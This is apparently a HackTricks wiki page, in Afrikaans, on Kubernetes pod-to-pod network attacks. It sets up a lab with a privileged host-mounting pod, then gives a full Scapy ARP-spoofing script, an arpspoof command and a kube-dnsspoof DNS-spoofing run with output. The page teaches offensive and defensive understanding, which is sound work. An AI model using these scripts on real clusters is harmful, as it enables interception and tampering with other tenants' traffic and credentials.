# Kubernetes Netwerk Aanvalle

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Inleiding

In Kubernetes word daar waargeneem dat 'n verstekgedrag die vestiging van verbindings tussen **alle houers wat op dieselfde node woon**, toelaat. Dit geld ongeag die namespace-onderskeidings. Sulke konnektiwiteit strek af tot **Laag 2** (Ethernet). Gevolglik stel hierdie konfigurasie moontlik die stelsel bloot aan kwesbaarhede. Spesifiek maak dit die moontlikheid oop vir 'n **boosaardige houer** om 'n **ARP-spoofing-aanval** teen ander houers wat op dieselfde node gele√´ is, uit te voer. Tydens so 'n aanval kan die boosaardige houer bedrieglik die netwerkverkeer wat bedoel is vir ander houers, onderskep of wysig.

ARP-spoofing-aanvalle behels dat die **aanvaller vervalsde ARP** (Adresoplossingsprotokol) boodskappe oor 'n plaaslike area-netwerk stuur. Dit lei daartoe dat die **MAC-adres van die aanvaller gekoppel word aan die IP-adres van 'n legitieme rekenaar of bediener op die netwerk**. Na suksesvolle uitvoering van so 'n aanval kan die aanvaller data wat in-transit is, onderskep, wysig of selfs stop. Die aanval word op Laag 2 van die OSI-model uitgevoer, daarom wek die verstekkonnektiwiteit in Kubernetes op hierdie laag sekuriteitskwessies op.

In die scenario gaan 4 masjiene geskep word:

* ubuntu-pe: Bevoorregte masjien om na die node te ontsnap en metriese te kontroleer (nie nodig vir die aanval nie)
* **ubuntu-aanval**: **Boosaardige** houer in verstek namespace
* **ubuntu-slachtoffer**: **Slagoffer** masjien in kube-stelsel namespace
* **mysql**: **Slagoffer** masjien in verstek namespace
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Basiese Kubernetes-netwerke

As jy meer inligting oor die netwerkonderwerpe wat hier ingevoer is, wil h√™, gaan na die verwysings.

### ARP

Oor die algemeen is **pod-to-pod-netwerke binne die node** beskikbaar via 'n **brug** wat al die pods verbind. Hierdie brug word "cbr0" genoem. (Sommige netwerkplugins sal hul eie brug installeer.) Die **cbr0 kan ook ARP** (Address Resolution Protocol) oplos. Wanneer 'n inkomende pakkie by cbr0 arriveer, kan dit die bestemmings-MAC-adres oplos met behulp van ARP.

Hierdie feit impliseer dat, standaard, **elke pod wat op dieselfde node loop**, in staat sal wees om **te kommunikeer** met enige ander pod in dieselfde node (onafhanklik van die namespace) op eternetho√´ (laag 2).

{% hint style="warning" %}
Daarom is dit moontlik om A**RP Spoofing-aanvalle tussen pods in dieselfde node** uit te voer.
{% endhint %}

### DNS

In kubernetes-omgewings sal jy gewoonlik 1 (of meer) **DNS-diens wat loop** in die kube-stelsel namespace vind:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
In die vorige inligting kan jy iets interessants sien, die **IP van die diens** is **10.96.0.10** maar die **IP van die peul** wat die diens hardloop is **172.17.0.2.**

As jy die DNS-adres binne enige peul nagaan, sal jy iets soos hierdie vind:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Echter, die houer weet nie hoe om na daardie adres te kom nie omdat die houerreeks in hierdie geval 172.17.0.10/26 is.

Daarom sal die houer die DNS-versoeke stuur na die adres 10.96.0.10 wat deur die cbr0 na 172.17.0.2 vertaal sal word.

{% hint style="warning" %}
Dit beteken dat 'n DNS-versoek van 'n houer altyd deur die brug sal gaan om die diens-IP na die eindpunt-IP te vertaal, selfs as die DNS-bediener in dieselfde subnetwerk as die houer is.

Wetende hiervan, en wetende dat ARP-aanvalle moontlik is, sal 'n houer in 'n node in staat wees om die verkeer tussen elke houer in die subnetwerk en die brug te onderskep en die DNS-antwoorde van die DNS-bediener te wysig (DNS-spoofing).

Verder, as die DNS-bediener in dieselfde node as die aanvaller is, kan die aanvaller al die DNS-versoeke van enige houer in die groep onderskep (tussen die DNS-bediener en die brug) en die antwoorde wysig.
{% endhint %}

## ARP-spoofing in houers in dieselfde Node

Ons doel is om ten minste die kommunikasie vanaf die ubuntu-slachtoffer na die mysql te steel.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Soos reeds genoem is, as jy 'n pod in dieselfde node van die DNS-bediener pod **kompromitteer**, kan jy **MitM** met **ARPSpoofing** die **brug en die DNS** pod en **alle DNS-antwoorde wysig**.

Jy het 'n baie goeie **werktuig** en **selfstudie** om dit te toets op [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

In ons scenario, **laai** die **werktuig** af in die aanvaller pod en skep 'n \*\*l√™er genaamd `hosts` \*\* met die **domeine** wat jy wil **spoof** soos:
```
cat hosts
google.com. 1.1.1.1
```
Voer die aanval uit op die ubuntu-slagofer-masjien:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
As jy probeer om jou eie DNS-spoofing skripsie te skep, as jy **net die DNS-antwoord wysig**, gaan dit **nie werk** nie, omdat die **antwoord** 'n **src IP** gaan h√™, die IP-adres van die **skadelike pod** en **sal nie** aanvaar word nie.\
Jy moet 'n **nuwe DNS-pakket** genereer met die **src IP** van die **DNS** waar die slagoffer die DNS-aanvraag stuur (iets soos 172.16.0.2, nie 10.96.0.10 nie, dit is die K8s DNS-diens IP en nie die DNS-bediener IP nie, meer hieroor in die inleiding).
{% endhint %}

## Vang Verkeer

Die instrument [**Mizu**](https://github.com/up9inc/mizu) is 'n eenvoudige-maar-kragtige API **verkeerskyker vir Kubernetes** wat jou in staat stel om **alle API-kommunikasie** tussen mikrodienste te **sien** om jou te help met die foutopsporing en probleemoplossing van regressies.\
Dit sal agente installeer in die gekose pods en hul verkeersinligting versamel en aan jou wys op 'n webbediener. Jy sal egter ho√´ K8s-permissies hiervoor benodig (en dit is nie baie sluipend nie).

## Verwysings

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
